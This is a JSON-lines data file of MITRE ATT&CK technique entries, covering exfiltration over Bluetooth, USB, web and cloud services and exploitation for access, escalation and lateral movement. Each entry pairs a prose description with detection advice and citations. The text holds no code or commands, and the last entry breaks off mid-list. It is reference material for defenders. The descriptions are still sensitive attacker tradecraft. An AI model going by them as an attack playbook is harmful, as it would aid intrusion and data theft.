{"ID":"T1011.001","name":"Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth","description":"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.","url":"https://attack.mitre.org/techniques/T1011/001","created":"09 March 2020","last modified":"08 March 2022","version":"1.1","tactics":"Exfiltration","detection":"Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.\n\nMonitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1011","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Symantec Beetlejuice),"}
{"ID":"T1052","name":"Exfiltration Over Physical Medium","description":"Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.","url":"https://attack.mitre.org/techniques/T1052","created":"31 May 2017","last modified":"15 October 2021","version":"1.2","tactics":"Exfiltration","detection":"Monitor file access on removable media. Detect processes that execute when removable media are mounted.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Drive: Drive Creation, File: File Access, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"William Cain","permissions required":null,"supports remote":null,"system requirements":"Presence of physical medium or device","impact type":null,"effective permissions":null,"relationship citations":",(Citation: TechNet Removable Media Control),(Citation: Microsoft Disable Autorun)"}
{"ID":"T1052.001","name":"Exfiltration Over Physical Medium: Exfiltration over USB","description":"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.","url":"https://attack.mitre.org/techniques/T1052/001","created":"11 March 2020","last modified":"15 October 2021","version":"1.1","tactics":"Exfiltration","detection":"Monitor file access on removable media. Detect processes that execute when removable media are mounted.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Drive: Drive Creation, File: File Access, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1052","defenses bypassed":null,"contributors":"William Cain","permissions required":null,"supports remote":null,"system requirements":"Presence of physical medium or device","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Kaspersky ProjectSauron Full Report),(Citation: ESET Sednit USBStealer 2014),(Citation: ESET Machete July 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Avira Mustang Panda January 2020),(Citation: FireEye APT30),(Citation: Securelist Machete Aug 2014),(Citation: Securelist Agent.btz),(Citation: TechNet Removable Media Control),(Citation: Microsoft Disable Autorun)"}
{"ID":"T1567","name":"Exfiltration Over Web Service","description":"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\n\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.","url":"https://attack.mitre.org/techniques/T1567","created":"09 March 2020","last modified":"19 October 2022","version":"1.2","tactics":"Exfiltration","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"William Cain","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Mandiant APT41),(Citation: BleepingComputer Molerats Dec 2020),(Citation: KISA Operation Muzabi),(Citation: MalwareBytes Ngrok February 2020),(Citation: Google Iran Threats October 2021),(Citation: TrendMicro Pawn Storm Dec 2020),"}
{"ID":"T1567.002","name":"Exfiltration Over Web Service: Exfiltration to Cloud Storage","description":"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ","url":"https://attack.mitre.org/techniques/T1567/002","created":"09 March 2020","last modified":"30 August 2022","version":"1.1","tactics":"Exfiltration","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1567","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: TrendMicro Confucius APT Feb 2018),(Citation: TrendMicro EarthLusca 2022),(Citation: NCC Group Chimera January 2021),(Citation: ESET Lazarus Jun 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Microsoft POLONIUM June 2022),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Symantec Waterbug Jun 2019),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET Nomadic Octopus 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: Rclone),(Citation: Microsoft HAFNIUM March 2020),(Citation: Bitdefender Naikon April 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Github PowerShell Empire),(Citation: Checkpoint IndigoZebra July 2021),(Citation: ESET ComRAT May 2020),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: ESET Crutch December 2020),(Citation: FireEye Periscope March 2018),(Citation: FireEye APT29),(Citation: Malwarebytes RokRAT VBA January 2021),"}
{"ID":"T1567.001","name":"Exfiltration Over Web Service: Exfiltration to Code Repository","description":"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. ","url":"https://attack.mitre.org/techniques/T1567/001","created":"09 March 2020","last modified":"28 March 2020","version":"1.0","tactics":"Exfiltration","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1567","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Github PowerShell Empire),"}
{"ID":"T1567.003","name":"Exfiltration Over Web Service: Exfiltration to Text Storage Sites","description":"Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.(Citation: Pastebin EchoSec)\n\n**Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs.","url":"https://attack.mitre.org/techniques/T1567/003","created":"27 February 2023","last modified":"04 May 2023","version":"1.0","tactics":"Exfiltration","detection":null,"platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1567","defenses bypassed":null,"contributors":"Harun Küßner","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1190","name":"Exploit Public-Facing Application","description":"Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). \n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)","url":"https://attack.mitre.org/techniques/T1190","created":"18 April 2018","last modified":"14 April 2023","version":"2.4","tactics":"Initial Access","detection":"Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","platforms":"Containers, IaaS, Linux, Network, Windows, macOS","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Praetorian; Yossi Weizman, Azure Defender Research Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cisco Group 72),(Citation: NCSC APT29 July 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Cybereason PowerLess February 2022),(Citation: ClearkSky Fox Kitten February 2020),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Dragos PARISITE ),(Citation: Secureworks REvil September 2019),(Citation: Unit 42 Rocke January 2019),(Citation: Securelist APT10 March 2021),(Citation: Microsoft NICKEL December 2021),(Citation: TrendMicro BlackTech June 2017),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FoxIT Wocao December 2019),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: sqlmap Introduction),(Citation: Novetta-Axiom),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Talos Rocke August 2018),(Citation: Microsoft GALLIUM December 2019),(Citation: FireEye Exchange Zero Days March 2021),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Check Point APT35 CharmPower January 2022),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: CISA SoreFang July 2016),(Citation: FireEye APT41 March 2020),(Citation: CrowdStrike PIONEER KITTEN August 2020),(Citation: Microsoft HAFNIUM March 2020),(Citation: Mandiant APT41),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: Volexity Exchange Marauder March 2021),(Citation: Talos ZxShell Oct 2014),(Citation: Symantec Chafer February 2018),(Citation: Tarrask scheduled task),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Unit 42 Siloscape Jun 2021),(Citation: McAfee Night Dragon),(Citation: Check Point Havij Analysis),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: KISA Operation Muzabi),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Volexity SolarWinds),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Cisco Talos Avos Jun 2022),(Citation: RedCanary Mockingbird May 2020),(Citation: OWASP Top 10)"}
{"ID":"T1203","name":"Exploitation for Client Execution","description":"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.","url":"https://attack.mitre.org/techniques/T1203","created":"18 April 2018","last modified":"18 April 2022","version":"1.4","tactics":"Execution","detection":"Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":false,"system requirements":"Remote exploitation for execution requires a remotely accessible service reachable over the network or other vector of access such as spearphishing or drive-by compromise.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Symantec Elderwood Sept 2012),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: RiskIQ Cobalt Nov 2017),(Citation: PTSecurity Higaisa 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Symantec Tick Apr 2016),(Citation: MSTIC NOBELIUM May 2021),(Citation: ATT Sidewinder January 2021),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Antiy CERT Ramsay April 2020),(Citation: Securelist ScarCruft Jun 2016),(Citation: McAfee Sandworm November 2013),(Citation: Talos Cobalt Strike September 2020),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: FireEye APT37 Feb 2018),(Citation: Sofacy DealersChoice),(Citation: TrendMicro Sandworm October 2014),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Talos Bisonal Mar 2020),(Citation: IssueMakersLab Andariel GoldenAxe May 2017),(Citation: Talos Cobalt Group July 2018),(Citation: TrendMicro BlackTech June 2017),(Citation: FireEye HAWKBALL Jun 2019),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: TrendMicro New Andariel Tactics July 2018),(Citation: FSI Andariel Campaign Rifle July 2017),(Citation: Google EXOTIC LILY March 2022),(Citation: Unit 42 Inception November 2018),(Citation: FireEye admin@338),(Citation: Trend Micro Tick November 2019),(Citation: Symantec Elfin Mar 2019),(Citation: iSight Sandworm Oct 2014),(Citation: Trend Micro IXESHE 2012),(Citation: Cylance Shaheen Nov 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Eset Ramsay May 2020),(Citation: Unit42 Xbash Sept 2018),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: Volexity Patchwork June 2018),(Citation: Trend Micro Xbash Sept 2018),(Citation: Uptycs Confucius APT Jan 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Moran 2014),(Citation: FireEye Clandestine Wolf),(Citation: Symantec Patchwork),(Citation: Splunk Supernova Jan 2021),(Citation: FireEye Clandestine Fox),(Citation: FireEye APT41 Aug 2019),(Citation: TrendMicro Tonto Team October 2020),(Citation: Talos Group123),(Citation: Talos Bisonal 10 Years March 2020),(Citation: ClearSky MuddyWater June 2019),(Citation: Accenture MUDCARP March 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: Cylance Dust Storm),(Citation: Microsoft Holmium June 2020),(Citation: FireEye Periscope March 2018),(Citation: Carnegie Mellon University Supernova Dec 2020),(Citation: Symantec Inception Framework March 2018),(Citation: Proofpoint TA459 April 2017),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Cisco Group 72),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Crowdstrike Global Threat Report Feb 2018),(Citation: Proofpoint Cobalt June 2017),(Citation: Microsoft DUBNIUM June 2016),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: ESET InvisiMole June 2020),(Citation: PaloAlto Patchwork Mar 2018),(Citation: McAfee Bankshot),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Talos Frankenstein June 2019),(Citation: Unit 42 BackConfig May 2020),(Citation: F-Secure The Dukes),(Citation: Gigamon Berserk Bear October 2021),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Securelist Sofacy Feb 2018),(Citation: Securelist Dropping Elephant),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Cymmetria Patchwork),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: Cyble Sidewinder September 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: RiskIQ Cobalt Jan 2018),(Citation: Ars Technica Pwn2Own 2017 VM Escape),(Citation: TechNet Moving Beyond EMET),(Citation: Wikipedia Control Flow Integrity),(Citation: Windows Blogs Microsoft Edge Sandbox)"}
{"ID":"T1212","name":"Exploitation for Credential Access","description":"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.","url":"https://attack.mitre.org/techniques/T1212","created":"18 April 2018","last modified":"28 April 2022","version":"1.4","tactics":"Credential Access","detection":"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen.","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content, Process: Process Creation, User Account: User Account Authentication","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"John Lambert, Microsoft Threat Intelligence Center","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Ars Technica Pwn2Own 2017 VM Escape),(Citation: TechNet Moving Beyond EMET),(Citation: Wikipedia Control Flow Integrity)"}
{"ID":"T1211","name":"Exploitation for Defense Evasion","description":"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.","url":"https://attack.mitre.org/techniques/T1211","created":"18 April 2018","last modified":"28 April 2022","version":"1.3","tactics":"Defense Evasion","detection":"Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery.","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, System access controls","contributors":"John Lambert, Microsoft Threat Intelligence Center","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft SIR Vol 19),(Citation: Bitdefender APT28 Dec 2015),(Citation: Ars Technica Pwn2Own 2017 VM Escape),(Citation: TechNet Moving Beyond EMET),(Citation: Wikipedia Control Flow Integrity)"}
{"ID":"T1068","name":"Exploitation for Privilege Escalation","description":"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).","url":"https://attack.mitre.org/techniques/T1068","created":"31 May 2017","last modified":"07 April 2023","version":"1.5","tactics":"Privilege Escalation","detection":"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery. Consider monitoring for the presence or loading (ex: Sysmon Event ID 6) of known vulnerable drivers that adversaries may drop and exploit to execute code in kernel mode.(Citation: Microsoft Driver Block Rules)\n\nHigher privileges are often necessary to perform additional actions such as some methods of [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Look for additional activity that may indicate an adversary has gained higher privileges.","platforms":"Containers, Linux, Windows, macOS","data sources":"Driver: Driver Load, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"David Tayouri; Idan Revivo, @idanr86, Team Nautilus Aqua Security; Joas Antonio dos Santos, @C0d3Cr4zy, Inmetrics; Yaniv Agman, @AgmanYaniv, Team Nautilus Aqua Security","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"User","relationship citations":"(Citation: Microsoft PLATINUM April 2016),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Unit42 AcidBox June 2020),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Microsoft CVE-2021-1732 Feb 2021),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET InvisiMole June 2020),(Citation: Novetta-Axiom),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: ESET Carberp March 2012),(Citation: ESET Sednit Part 1),(Citation: FireEye APT32 May 2017),(Citation: FireEye APT33 Guardrail),(Citation: ESET T3 Threat Report 2021),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: DBAPPSecurity BITTER zero-day Feb 2021),(Citation: FireEye Fin8 May 2016),(Citation: Mandiant APT41),(Citation: FireEye FIN6 April 2016),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: TrendMicro Tonto Team October 2020),(Citation: Group IB Ransomware September 2020),(Citation: Microsoft SIR Vol 19),(Citation: Unit 42 Hildegard Malware),(Citation: Prevx Carberp March 2011),(Citation: F-Secure The Dukes),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Securelist Sofacy Feb 2018),(Citation: Symantec Whitefly March 2019),(Citation: ESET Sednit July 2015),(Citation: Check Point APT31 February 2021),(Citation: Bitdefender APT28 Dec 2015),(Citation: Microsoft SIR Vol 21),(Citation: Profero APT27 December 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Ars Technica Pwn2Own 2017 VM Escape),(Citation: Microsoft Driver Block Rules),(Citation: TechNet Moving Beyond EMET),(Citation: Wikipedia Control Flow Integrity)"}
{"ID":"T1210","name":"Exploitation of Remote Services","description":"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.","url":"https://attack.mitre.org/techniques/T1210","created":"18 April 2018","last modified":"24 February 2022","version":"1.1","tactics":"Lateral Movement","detection":"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of [Discovery](https://attack.mitre.org/tactics/TA0007), or other unusual network traffic that may indicate additional tools transferred to the system.","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"ExtraHop","permissions required":"User","supports remote":null,"system requirements":"Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: TrendMicro EarthLusca 2022),(Citation: ClearkSky Fox Kitten February 2020),(Citation: FireEye APT28 Hospitality Aug 2017),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Secureworks Emotet Nov 2018),(Citation: Talos Nyetya June 2017),(Citation: ESET InvisiMole June 2020),(Citation: Symantec Cicada November 2020),(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Kaspersky Flame Functionality),(Citation: Crowdstrike Qakbot October 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Unit42 Emissary Panda May 2019),(Citation: FireEye WannaCry 2017),(Citation: CrowdStrike PIONEER KITTEN August 2020),(Citation: US-CERT WannaCry 2017),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: Unit 42 Lucifer June 2020),(Citation: US-CERT NotPetya 2017),(Citation: Github PowerShell Empire),(Citation: Red Canary Emotet Feb 2019),(Citation: GitHub PoshC2),(Citation: TrendMicro Tonto Team October 2020),(Citation: ESET Trickbot Oct 2020),(Citation: Symantec Emotet Jul 2018),(Citation: Secure List 